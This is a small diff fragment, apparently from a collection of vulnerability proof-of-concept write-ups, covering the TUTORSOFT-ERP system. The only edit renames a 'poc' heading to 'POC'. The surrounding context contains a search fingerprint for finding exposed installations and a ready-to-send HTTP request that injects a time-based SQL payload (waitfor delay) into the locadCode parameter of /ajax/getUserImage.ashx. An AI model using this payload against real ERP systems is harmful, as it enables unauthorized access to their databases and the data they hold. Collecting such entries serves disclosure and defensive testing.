@@ -8,7 +8,7 @@
 app="TUTORSOFT-ERP"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:5 HTTP/1.1
